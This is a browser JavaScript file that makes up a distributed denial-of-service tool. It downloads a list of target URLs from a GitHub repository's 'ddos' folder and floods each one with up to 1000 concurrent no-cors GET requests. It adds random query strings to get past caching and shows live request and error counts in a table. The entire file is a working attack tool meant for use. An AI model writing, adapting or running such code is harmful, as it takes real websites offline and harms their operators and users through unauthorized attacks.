
const ERROR_SYMBOL = "❌";
const SUCCESS_SYMBOL = "✔️"
const NO_RESPONSE_SYMBOL = "☠️";
const targetsURL = 'https://raw.githubusercontent.com/anondevua/anondevua.github.io/main/ddos/';
const updateInterval = 500;
const fetchTimeout = 1000;
const CONCURRENCY_LIMIT = 1000;
const RESULTS_NUM = 10

var targetStats = {}
var statsEl = document.getElementById('stats');
var descEl = document.getElementById('description');

function printStats() {
    for (var [target, stats] of Object.entries(targetStats)) {
        stats.last_responses = stats.last_responses.slice(-RESULTS_NUM)
    }
    var table_body = Object.entries(targetStats).map(
        ([target, { number_of_requests, number_of_errored_responses, last_responses }]) =>
            '<tr style="background-color:' +
            (last_responses.includes(ERROR_SYMBOL) ? '#FF4500' :
                last_responses.includes(SUCCESS_SYMBOL) ? '#3CB371' : '#FFEFD5') +
            '"><td>' + target +
            '</td><td>' + number_of_requests +
            '</td><td>' + number_of_errored_responses +
            '</td><td>' + last_responses.join('') +
            '</td></tr>'
    ).join('')
    statsEl.innerHTML = '<table width="100%"><thead><tr><th>URL</th><th>Number of Requests</th><th>Number of Errors</th><th>Responses</th></tr></thead><tbody>' + table_body + '</tbody></table>'
}
setInterval(printStats, updateInterval);

var queue = []
async function fetchWithTimeout(resource, options) {
    const controller = new AbortController();
    const id = setTimeout(() => controller.abort(), options.timeout);
    return fetch(resource, {
        method: 'GET',
        mode: 'no-cors',
        signal: controller.signal
    }).then((response) => {
        clearTimeout(id);
        return response;
    }).catch((error) => {
        clearTimeout(id);
        throw error;
    });
}

async function flood(target) {
    for (var i = 0; ; ++i) {
        if (queue.length > CONCURRENCY_LIMIT) {
            await queue.shift()
        }
        rand = i % 3 === 0 ? '' : ('?' + Math.random() * 1000)
        queue.push(
            fetchWithTimeout(target + rand, { timeout: fetchTimeout })
                .catch((error) => {
                    if (error.code === 20 /* ABORT */) {
                        return;
                    }
                    targetStats[target].number_of_errored_responses++;
                    targetStats[target].last_responses.push(ERROR_SYMBOL);
                })
                .then((response) => {
                    if (response) {
                        if (!response.ok) {
                            targetStats[target].number_of_errored_responses++;
                            targetStats[target].last_responses.push(NO_RESPONSE_SYMBOL);
                        }
                    }
                    targetStats[target].last_responses.push(SUCCESS_SYMBOL);
                    targetStats[target].number_of_requests++;
                })
        )
    }
}

fetch(targetsURL + "targets.json").then((r) => {
    r.json().then((d) => {
        rand = Math.random() % d.length
        const element = d[rand];
        descEl.innerHTML = element["description"];
        fetch(targetsURL + element['name'] + ".txt").then((r) => {
            r.text().then((d) => {
                let targets = d.split('\n');
                targets.forEach((target) => {
                    targetStats[target] = {
                        number_of_requests: 0,
                        number_of_errored_responses: 0,
                        last_responses: []
                    }
                })
                targets.map(flood);
            });
        });
    });
});
